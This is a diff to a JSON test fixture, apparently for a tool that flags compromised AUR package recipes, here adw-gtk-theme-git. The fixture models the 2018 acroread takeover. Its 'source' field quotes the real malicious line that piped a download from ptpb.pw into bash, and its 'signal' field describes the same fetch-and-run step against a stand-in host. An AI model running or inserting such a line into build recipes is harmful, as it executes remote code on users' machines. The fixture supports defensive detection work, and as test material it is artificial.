@@ -2,11 +2,9 @@
   "package": "adw-gtk-theme-git",
   "pkgbase": "adw-gtk-theme-git",
   "old": "5.10.r2.g5962743-1",
-  "new": "latest-commit",
   "expect": "flagged",
   "source": "Models the July 2018 acroread takeover's `curl -s https://ptpb.pw/~x|bash -&` line (https://lists.archlinux.org/pipermail/aur-general/2018-July/034151.html) after a user has built the compromised recipe: the line is in the helper's cached copy and the fetched recipe alike, so the recipe reads unchanged and has no diff. Base recipe AUR adw-gtk-theme-git commit 16fdc46376a5c1f758b2a1fc372be741c1931f26, https://aur.archlinux.org/cgit/aur.git/commit/?h=adw-gtk-theme-git&id=16fdc46376a5c1f758b2a1fc372be741c1931f26; recipe licence: 0BSD (LICENSE in the AUR repository); a -git devel update, which paru v2.1.0 -Qua lists as `latest-commit` (src/query.rs:113-115)",
   "signal": "build() pipes a download from ptpb.invalid into bash, in both the cached and the fetched PKGBUILD",
   "install": "none",
-  "installerRisk": false,
-  "recipe": "unchanged"
+  "installerRisk": false
 }
